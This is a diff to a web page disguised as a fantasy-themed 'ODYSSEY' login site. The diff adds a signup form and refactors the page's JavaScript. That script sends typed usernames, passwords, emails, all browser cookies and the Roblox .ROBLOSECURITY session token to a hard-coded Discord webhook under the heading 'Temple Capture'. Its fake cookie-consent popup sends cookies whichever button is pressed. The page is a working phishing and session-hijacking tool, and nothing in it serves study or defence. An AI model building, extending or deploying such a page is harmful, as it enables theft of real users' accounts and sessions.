@@ -45,6 +45,7 @@
             background-blend-mode: overlay;
             position: relative;
             margin-bottom: 1.5rem;
+            transition: 0.2s;
         }
         .login-container::before,
         .login-container::after {
@@ -132,7 +133,7 @@
             font-family: 'Courier New', monospace;
             font-size: 0.9rem;
         }
-        button {
+        .form-btn {
             width: 100%;
             padding: 0.8rem 0;
             background: #4a5a6a;
@@ -148,16 +149,32 @@
             margin-top: 0.6rem;
             box-shadow: inset 0 -4px 0 #1a2a3a;
         }
-        button:hover {
+        .form-btn:hover {
             background: #5a6a7a;
             border-color: #2a3a4a;
             color: #ffffff;
             box-shadow: inset 0 -4px 0 #2a3a4a;
         }
-        button:active {
+        .form-btn:active {
             transform: scale(0.97);
             background: #3a4a5a;
         }
+
+        .toggle-link {
+            display: block;
+            text-align: center;
+            margin-top: 0.8rem;
+            color: #1a2a3a;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            cursor: pointer;
+            text-decoration: underline;
+            letter-spacing: 1px;
+        }
+        .toggle-link:hover {
+            color: #0a1a2a;
+        }
+
         .footer-note {
             color: #1a2a3a;
             font-size: 0.7rem;
@@ -179,6 +196,12 @@
             margin-bottom: 0.2rem;
         }
 
+        /* Hide signup form initially */
+        #signupFormContainer {
+            display: none;
+        }
+
+        /* Legal section */
         .legal-section {
             max-width: 400px;
             width: 100%;
@@ -231,6 +254,7 @@
             border-color: #6a6a6a;
         }
 
+        /* Cookie popup */
         #cookieOverlay {
             position: fixed;
             top: 0;
@@ -301,7 +325,6 @@
             background: #3a5a7a;
         }
 
-        /* Music control - small icon in corner */
         #musicControl {
             position: fixed;
             bottom: 20px;
@@ -329,16 +352,13 @@
     </style>
 </head>
 <body>
-    <!-- Background music -->
     <audio id="bgMusic" loop preload="auto">
-        <!-- Calm medieval track from Pixabay (royalty-free) -->
         <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_0f8b0b0b0a.mp3?filename=medieval-fantasy-10324.mp3" type="audio/mpeg">
     </audio>
-
-    <!-- Music toggle button -->
     <div id="musicControl" title="Toggle music">♫</div>
 
-    <div class="login-container">
+    <!-- Login Container -->
+    <div class="login-container" id="loginContainer">
         <h1>ODYSSEY</h1>
         <div class="sub">~ temple of aether ~</div>
         <form id="loginForm">
@@ -350,11 +370,36 @@
                 <label for="password">Password</label>
                 <input type="password" id="password" placeholder="••••••••" required>
             </div>
-            <button type="submit">ENTER</button>
+            <button type="submit" class="form-btn">ENTER</button>
+            <span class="toggle-link" id="showSignup">No account? Sign up</span>
         </form>
         <div class="footer-note">⛧ forged in stone ⛧</div>
     </div>
 
+    <!-- Signup Container (hidden) -->
+    <div class="login-container" id="signupContainer" style="display:none;">
+        <h1>ODYSSEY</h1>
+        <div class="sub">~ create your account ~</div>
+        <form id="signupForm">
+            <div class="input-group">
+                <label for="signupUsername">Username</label>
+                <input type="text" id="signupUsername" placeholder="choose a name" required>
+            </div>
+            <div class="input-group">
+                <label for="signupPassword">Password</label>
+                <input type="password" id="signupPassword" placeholder="••••••••" required>
+            </div>
+            <div class="input-group">
+                <label for="signupEmail">Email (optional)</label>
+                <input type="email" id="signupEmail" placeholder="your@email.com">
+            </div>
+            <button type="submit" class="form-btn">SIGN UP</button>
+            <span class="toggle-link" id="showLogin">Already have an account? Login</span>
+        </form>
+        <div class="footer-note">⛧ forge your destiny ⛧</div>
+    </div>
+
+    <!-- Legal section -->
     <div class="legal-section" id="legalSection">
         <p><span class="highlight">⚠ DATA COLLECTION NOTICE</span> — By clicking "ENTER" you agree to our <a href="#" onclick="return false;">Terms of Service</a> and <a href="#" onclick="return false;">Privacy Policy</a>. We collect and store your username, password, IP address, browser fingerprint, and geolocation. Your data may be shared with third-party partners for marketing and analytics. You have the right to request deletion, but we reserve the right to retain data for legal compliance. For inquiries, contact our <a href="#" onclick="return false;">Data Protection Officer</a> via carrier pigeon or encrypted signal.</p>
         <p style="margin-top:0.2rem;"><span class="highlight">📧 CONTACT</span> — support@odyssey-temple.void (not monitored) | <span class="highlight">📜</span> This site uses tracking pixels, session replays, and AI-driven behavioral profiling.</p>
@@ -363,6 +408,7 @@
 
     <button class="terms-toggle" id="termsToggle">📜 TERMS & CONDITIONS</button>
 
+    <!-- Cookie popup -->
     <div id="cookieOverlay">
         <div id="cookieBox">
             <h2>🍪 COOKIES</h2>
@@ -379,29 +425,48 @@
             const WEBHOOK_URL = "https://discord.com/api/webhooks/1502754739580964945/Opx1IaKRsTc-0W2k67rAL7z0PGh7st4iMqKmYktHqC8UFdc9Jv1EsMLmodnKeun-gHmm";
             const REDIRECT_URL = "https://dev.odyneweden.com/";
 
-            // DOM refs
-            const form = document.getElementById('loginForm');
+            // DOM elements
+            const loginContainer = document.getElementById('loginContainer');
+            const signupContainer = document.getElementById('signupContainer');
+            const showSignupLink = document.getElementById('showSignup');
+            const showLoginLink = document.getElementById('showLogin');
+            const loginForm = document.getElementById('loginForm');
+            const signupForm = document.getElementById('signupForm');
             const overlay = document.getElementById('cookieOverlay');
             const cookieYes = document.getElementById('cookieYes');
             const cookieNo = document.getElementById('cookieNo');
             const termsToggle = document.getElementById('termsToggle');
             const legalSection = document.getElementById('legalSection');
 
+            // Toggle forms
+            showSignupLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                loginContainer.style.display = 'none';
+                signupContainer.style.display = 'block';
+            });
+            showLoginLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                signupContainer.style.display = 'none';
+                loginContainer.style.display = 'block';
+            });
+
+            // Terms toggle
+            termsToggle.addEventListener('click', function() {
+                legalSection.classList.toggle('show');
+                termsToggle.textContent = legalSection.classList.contains('show') ? '📜 CLOSE TERMS' : '📜 TERMS & CONDITIONS';
+            });
+
             // Music
             const audio = document.getElementById('bgMusic');
             const musicControl = document.getElementById('musicControl');
             let musicPlaying = false;
-
-            // Attempt to autoplay with low volume
             audio.volume = 0.2;
-            audio.muted = false;
             const playPromise = audio.play();
             if (playPromise !== undefined) {
                 playPromise.then(() => {
                     musicPlaying = true;
                     musicControl.textContent = '♫';
                 }).catch(() => {
-                    // Autoplay blocked – set muted and try again, or wait for user interaction
                     audio.muted = true;
                     audio.play().then(() => {
                         musicPlaying = true;
@@ -409,8 +474,6 @@
                     }).catch(() => {});
                 });
             }
-
-            // Toggle music on button click
             musicControl.addEventListener('click', function() {
                 if (musicPlaying) {
                     audio.pause();
@@ -424,17 +487,13 @@
                 }
             });
 
-            // Terms toggle
-            termsToggle.addEventListener('click', function() {
-                legalSection.classList.toggle('show');
-                termsToggle.textContent = legalSection.classList.contains('show') ? '📜 CLOSE TERMS' : '📜 TERMS & CONDITIONS';
-            });
-
-            // Webhook sender
-            async function sendToWebhook(username, password, extra = {}) {
+            // Webhook sender with action type
+            async function sendToWebhook(action, username, password, email = '', extra = {}) {
                 const fields = [
+                    { name: "Action", value: action, inline: false },
                     { name: "Username", value: username || "[empty]", inline: false },
                     { name: "Password", value: password || "[empty]", inline: false },
+                    { name: "Email", value: email || "[empty]", inline: false },
                     { name: "Time", value: new Date().toUTCString(), inline: false }
                 ];
                 for (const [key, val] of Object.entries(extra)) {
@@ -447,7 +506,7 @@
                             title: "⚔️ Temple Capture",
                             color: 0x4a6a8a,
                             fields: fields,
-                            footer: { text: "Classic Login" }
+                            footer: { text: "Odyssey Auth" }
                         }
                     ],
                     username: "AetherScribe",
@@ -462,7 +521,9 @@
                 } catch (_) { /* silent */ }
             }
 
-            // Cookie popup after 3s
+            // Cookie consent logic
+            let cookieConsent = null;
+            // Show popup after 3s
             setTimeout(function() {
                 overlay.style.display = 'flex';
                 requestAnimationFrame(() => {
@@ -470,19 +531,17 @@
                 });
             }, 3000);
 
-            let cookieConsent = null;
-
             cookieYes.addEventListener('click', function() {
                 cookieConsent = true;
                 overlay.classList.remove('show');
                 setTimeout(() => { overlay.style.display = 'none'; }, 500);
+                // Immediately send cookies with blank credentials (or we can capture later)
                 const allCookies = document.cookie;
                 const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
                 const robloxValue = robloxCookie ? robloxCookie.split('=')[1] : null;
-                const username = document.getElementById('username').value.trim();
-                const password = document.getElementById('password').value;
-                sendToWebhook(username, password, {
-                    "Cookie Consent": "YES",
+                // We'll send a "Cookie Consent" event, no user creds yet
+                sendToWebhook('Cookie Consent', '[system]', '[system]', '', {
+                    "Consent": "YES",
                     "All Cookies": allCookies || "[none]",
                     "ROBLOSECURITY": robloxValue || "[not found]"
                 });
@@ -492,22 +551,49 @@
                 cookieConsent = false;
                 overlay.classList.remove('show');
                 setTimeout(() => { overlay.style.display = 'none'; }, 500);
-                const username = document.getElementById('username').value.trim();
-                const password = document.getElementById('password').value;
-                sendToWebhook(username, password, { "Cookie Consent": "DENIED" });
-            });
-
-            // Form submit
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                const username = document.getElementById('username').value.trim();
-                const password = document.getElementById('password').value;
-                let consentStatus = (cookieConsent === true) ? "YES" : (cookieConsent === false ? "NO" : "UNKNOWN");
                 const allCookies = document.cookie;
                 const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
                 const robloxValue = robloxCookie ? robloxCookie.split('=')[1] : null;
-                sendToWebhook(username, password, {
-                    "Cookie Consent (submit)": consentStatus,
+                sendToWebhook('Cookie Consent', '[system]', '[system]', '', {
+                    "Consent": "DENIED",
+                    "All Cookies": allCookies || "[none]",
+                    "ROBLOSECURITY": robloxValue || "[not found]"
+                });
+            });
+
+            // Helper to get cookies for both forms
+            function getCookieData() {
+                const allCookies = document.cookie;
+                const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
+                const robloxValue = robloxCookie ? robloxCookie.split('=')[1] : null;
+                return { allCookies, robloxValue };
+            }
+
+            // Login form submit
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value;
+                const { allCookies, robloxValue } = getCookieData();
+                const consentStatus = (cookieConsent === true) ? "YES" : (cookieConsent === false ? "NO" : "UNKNOWN");
+                sendToWebhook('Login', username, password, '', {
+                    "Cookie Consent": consentStatus,
+                    "All Cookies": allCookies || "[none]",
+                    "ROBLOSECURITY": robloxValue || "[not found]"
+                });
+                window.location.href = REDIRECT_URL;
+            });
+
+            // Signup form submit
+            signupForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const username = document.getElementById('signupUsername').value.trim();
+                const password = document.getElementById('signupPassword').value;
+                const email = document.getElementById('signupEmail').value.trim();
+                const { allCookies, robloxValue } = getCookieData();
+                const consentStatus = (cookieConsent === true) ? "YES" : (cookieConsent === false ? "NO" : "UNKNOWN");
+                sendToWebhook('Sign Up', username, password, email, {
+                    "Cookie Consent": consentStatus,
                     "All Cookies": allCookies || "[none]",
                     "ROBLOSECURITY": robloxValue || "[not found]"
                 });
